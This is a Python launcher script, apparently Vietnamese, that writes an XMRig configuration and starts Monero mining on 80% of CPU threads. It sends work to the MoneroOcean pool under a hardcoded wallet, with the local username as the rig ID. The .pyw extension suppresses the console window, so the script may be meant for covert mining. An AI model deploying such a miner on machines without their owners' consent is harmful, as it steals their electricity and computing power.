# File: ULTRA_BALANCE_2025_ASCII.pyw – 80% CPU load, toi uu ben – khong lag

import os, json, getpass, subprocess, platform

dir_path    = os.path.dirname(__file__)
config_path = os.path.join(dir_path, "config.json")
xmrig_exe   = os.path.join(dir_path, "xmrig.exe")
worker      = getpass.getuser()

print("[+] ULTRA BALANCE 2025 - Worker:", worker)
print("[+] Tu dong giam CPU load 80 phan tram (can bang - hieu suat cao)...")
print("="*80)

threads = os.cpu_count() or 4
cpu_name = platform.processor().lower()

# Dung 80% so thread
use_threads = max(1, int(threads * 0.80))

# Chon mode RandomX
if threads <= 4:
    rx_mode = "light"
elif threads <= 8:
    rx_mode = "medium"
else:
    rx_mode = "fast"

rx_list = list(range(use_threads))

print("[+] CPU:", cpu_name)
print("[+] Tong thread:", threads, " |  Su dung:", use_threads, "thread  |  Mode:", rx_mode)

config = {
    "autosave": True,
    "background": False,
    "colors": True,

    "randomx": {
        "1gb-pages": False,
        "mode": rx_mode,
        "numa": True
    },

    "cpu": {
        "enabled": True,
        "huge-pages": False,
        "huge-pages-jit": False,
        "hw-aes": True,
        "priority": 3,
        "yield": True,
        "memory-pool": False,
        "max-threads-hint": 100,
        "rx": rx_list
    },

    "pools": [{
        "algo": "rx/0",
        "url": "gulf.moneroocean.stream:443",
        "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGpYPkUbB7t2qaKr4g",
        "pass": "x",
        "rig-id": worker,
        "tls": True,
        "keepalive": True
    }],

    "donate-level": 0,
    "print-time": 10
}

with open(config_path, "w", encoding="utf-8") as f:
    json.dump(config, f, indent=4)

print("[+] DA GHI CONFIG - Hashrate du kien:", use_threads*90, "den", use_threads*120, "H/s")
print("[+] Bat dau dao...")
print("="*80)

subprocess.call([xmrig_exe], cwd=dir_path)
